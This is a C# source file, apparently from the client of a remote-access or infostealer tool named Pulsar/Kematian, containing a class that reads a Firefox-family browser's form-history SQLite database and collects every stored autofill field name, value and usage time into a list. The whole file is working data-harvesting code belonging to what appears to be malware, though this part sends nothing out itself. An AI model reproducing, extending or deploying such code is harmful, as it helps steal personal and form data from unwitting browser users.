using Pulsar.Client.Kematian.Browsers.Helpers.SQL;
using Pulsar.Client.Kematian.Browsers.Helpers.Structs;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;

namespace Pulsar.Client.Kematian.Browsers.Gecko.Autofill
{
    public class AutofillGecko
    {
        public static List<AutoFillData> GetAutofill(string formHistoryPath)
        {
            var autofillData = new List<AutoFillData>();
            
            if (!File.Exists(formHistoryPath))
            {
                return autofillData;
            }
            
            try
            {
                SQLiteHandler sqlDatabase = new SQLiteHandler(formHistoryPath);
                
                if (!sqlDatabase.ReadTable("moz_formhistory"))
                {
                    if (!sqlDatabase.ReadTable("formhistory"))
                    {
                        Debug.WriteLine("Failed to read form history table from database.");
                        return autofillData;
                    }
                }
                
                for (int i = 0; i < sqlDatabase.GetRowCount(); i++)
                {
                    try
                    {
                        string fieldName = sqlDatabase.GetValue(i, "fieldname");
                        string value = sqlDatabase.GetValue(i, "value");
                        
                        string times_used = "1";
                        string first_used = DateTime.Now.ToString("yyyy-MM-dd HH:mm:ss");
                        string last_used = DateTime.Now.ToString("yyyy-MM-dd HH:mm:ss");
                        
                        try { times_used = sqlDatabase.GetValue(i, "timesUsed"); } catch { }
                        try { first_used = sqlDatabase.GetValue(i, "firstUsed"); } catch { }
                        try { last_used = sqlDatabase.GetValue(i, "lastUsed"); } catch { }

                        var autofill = new AutoFillData(
                            fieldName, 
                            value, 
                            value.ToLowerInvariant(), 
                            first_used,
                            last_used,
                            times_used
                        );
                        
                        autofillData.Add(autofill);
                    }
                    catch (Exception ex)
                    {
                        Debug.WriteLine($"Error processing autofill at index {i}: {ex.Message}");
                    }
                }
            }
            catch (Exception ex)
            {
                Debug.WriteLine($"Error opening form history database: {ex.Message}");
            }

            return autofillData;
        }
    }
} 